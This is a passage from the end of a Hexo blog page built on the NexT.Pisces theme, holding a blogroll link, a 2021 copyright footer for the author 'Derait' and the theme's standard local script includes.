        <li class="links-of-blogroll-item">
          <a href="http://poilzero.sipc115.club/" title="http:&#x2F;&#x2F;poilzero.sipc115.club&#x2F;" rel="noopener" target="_blank">poilzero</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2021-08 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Derait</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
